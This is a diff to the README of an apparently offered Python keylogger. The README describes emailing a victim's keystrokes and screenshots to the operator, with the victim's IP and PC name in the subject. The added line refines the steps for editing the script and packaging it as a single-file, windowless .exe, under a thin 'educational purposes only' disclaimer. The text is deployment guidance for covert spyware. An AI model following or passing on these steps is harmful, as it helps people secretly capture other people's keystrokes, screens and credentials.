@@ -2,7 +2,7 @@
 Just Keylogger in python. Sending logs, screenshots, straight to your email. IP, and Pc name of victim will be in subject. disclaimer! for educational purposes only!
 
 # How To Use
-Edit these lines od code: 88,89,90, then convert from .Py to Exe. Make sure to conv it to one file and NotConsoleBased.
+Edit these lines od code: 88,89,90, then convert from .Py to Exe.(Before Converting change in line 45,47, name of file from *.py to *.exe) Make sure to conv it to one file and NotConsoleBased.
 
 # How to Convert
 https://www.youtube.com/watch?v=lOIJIk_maO4
